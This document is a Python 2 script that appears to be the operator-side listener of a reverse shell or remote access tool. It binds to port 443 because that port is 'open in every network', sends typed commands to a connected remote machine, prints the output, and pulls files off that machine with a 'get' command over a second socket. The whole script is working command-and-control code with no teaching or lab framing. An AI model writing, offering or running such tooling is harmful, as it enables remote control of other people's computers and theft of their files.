import socket
import sys

s = socket.socket()
# Your Host IP
host = "192.168.1.2"
# Any port; using 443 because open in every network
port = 443
buffSize = 1024
s.bind((host, port))
print ('Setup at ', host)
s.listen(5)
c, addr = s.accept();
print ("Connected to ", addr)
print (c.recv(buffSize).decode("utf-8"))
print ("Shot Commands!")
run = True
while run:
    try:
        cmd = str(raw_input(str(addr)+">"))
        if cmd == "\n" or cmd is not None:
            c.send(cmd+'\n')
        else:
            continue
        isFileReq = cmd.startswith("get ")
        response = ""
        if not isFileReq:
            response = c.recv(buffSize).strip().decode("utf-8")
            keepReading = True
            while keepReading:
                keepReading = '$endRes$' not in response
                if not keepReading:
                    response = response.replace("$endRes$","")
                print (response)
                if keepReading:
                    response = c.recv(buffSize).strip().decode("utf-8")
        else:
            fileName = cmd.split(" ")[1]
            if fileName is not None and fileName != "":
                savePath = "/"+fileName
                file = open(savePath, "w")
                print ("Receiving file at ", savePath)
                print ("Establising Data Socket")
                dataSock, addr = s.accept()
                print ("Data Socket Establised")
                dataSock.settimeout(2.0)
                chunk = dataSock.recv(buffSize)
                rc = 0
                print("Receiving File...")
                while chunk:
                    file.write(chunk)
                    rc += len(chunk)
                    chunk = dataSock.recv(buffSize)
                file.close()
                dataSock.close()
                print ("Bytes Received: ", rc,)
                print ("File Received at ", savePath)
                # Just to consume the last end message
                response = c.recv(buffSize).strip().decode("utf-8")
            
        if response == "bye":
            run = False
            c.close()
            sys.exit(0)
            print ("Exit!")
    except KeyboardInterrupt:
        print("handled")

